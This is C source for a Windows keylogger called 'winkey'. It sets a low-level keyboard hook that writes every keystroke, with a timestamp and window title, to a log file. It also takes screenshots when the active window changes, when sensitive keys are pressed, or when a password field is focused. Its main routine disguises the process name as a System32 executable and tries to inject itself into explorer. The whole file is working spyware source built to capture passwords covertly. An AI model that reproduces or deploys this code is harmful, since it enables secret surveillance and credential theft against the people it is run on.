#include "../winkey.h"

HHOOK g_ouk;

void *which_open(char *exe)
{
	HWND ptr_stuct = GetForegroundWindow();
	DWORD pid = 0;
	GetWindowThreadProcessId(ptr_stuct, &pid);
	HANDLE hd = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hd)
	{
		GetModuleFileNameExA(hd, NULL,exe, MAX_PATH);
		CloseHandle(hd);
	}
}
LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
{
    static HWND last_window = NULL;
    char exe[MAX_PATH] = {0};
    char key[8] = {0};
    char time[64];
    char title[256] = {0};

    if (ncode == HC_ACTION && wp == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
        HWND current = GetForegroundWindow();
        if (current && current != last_window)
        {
            capture_screen(L"C:\\winkey_screens\\window_change.bmp");
            last_window = current;
        }
        if (is_sensitive_key(kbd->vkCode))
            capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
        if (is_password_field(current))
            capture_screen(L"C:\\winkey_screens\\password_field.bmp");
        which_open(exe);
        get_time(time);
        get_window_title(title);
        int new_key = vk_to_char(kbd->vkCode, key);
        char *spe_touch = special_touch(kbd->vkCode);
        FILE *f = fopen("winkey.log", "a");
        if (f)
        {
            fprintf(f, "[%s] - '%s'\n", time, title);
            if (spe_touch)
                fprintf(f, "<%s>\n", spe_touch);
            else if (new_key)
                fprintf(f, "%s\n", key);
            else
                fprintf(f, "VK(%lu)\n", kbd->vkCode);

            fclose(f);
        }
    }
    return CallNextHookEx(g_ouk, ncode, wp, lp);
}



void run_winkey(void)
{
	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
	MSG msg;
	if (!g_ouk)
	{
		printf("Error: can't install the hook.\n");
		return 1;
	}
	printf("winkey: hook install ;)");
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(g_ouk);
}
int main(void)
{
	disguise_process_name(L"C:\\Windows\\System32\\host.exe");
	if (inject_into_explorer())
		return 0;
	run_winkey();
	return 0;
}